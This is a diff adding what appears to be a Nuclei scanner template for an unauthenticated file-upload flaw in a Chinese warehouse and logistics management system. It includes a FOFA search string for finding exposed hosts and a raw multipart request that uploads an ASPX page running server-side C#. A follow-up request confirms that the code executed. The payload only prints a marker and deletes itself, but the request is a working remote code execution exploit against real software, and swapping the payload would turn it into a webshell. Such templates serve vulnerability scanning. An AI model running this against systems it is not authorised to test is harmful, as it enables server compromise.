@@ -1,0 +1,46 @@
+id: wms-logistics-business_upload-file-upload
+
+info:
+  name: "仓储及物流管理系统 Business_Upload.ashx 文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/Images/frame/login_title.png"
+          文件目录： /UploadImages/?.aspx
+  tags: 仓储及物流管理系统
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /Module_Basic/Customers/Business_Upload.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Content-Type: multipart/form-data; boundary=----geckoformboundary75ee300bbeeb4fd0cdb92729f0a26360
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+
+    ------geckoformboundary75ee300bbeeb4fd0cdb92729f0a26360
+    Content-Disposition: form-data; name="name"
+
+    NTest.aspx
+    ------geckoformboundary75ee300bbeeb4fd0cdb92729f0a26360
+    Content-Disposition: form-data; name="file"; filename="NTest.aspx"
+    Content-Type: application/html
+
+    <%@ Page Language="C#"%><% Response.Write("NdayTest"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+    ------geckoformboundary75ee300bbeeb4fd0cdb92729f0a26360--
+- raw:
+  - |
+    GET /UploadImages/NTest.aspx HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
